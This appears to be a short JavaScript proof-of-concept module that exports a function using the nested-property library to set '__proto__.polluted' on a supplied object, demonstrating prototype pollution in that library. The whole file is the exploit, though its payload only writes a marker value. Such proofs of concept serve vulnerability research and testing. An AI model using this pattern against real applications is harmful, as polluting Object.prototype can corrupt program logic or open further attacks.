const nestedProperty = require("nested-property"); // Ensure nestedProperty is required here

function exploitFunction(payload) {
    const { object1 } = payload;
    nestedProperty.set(object1, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };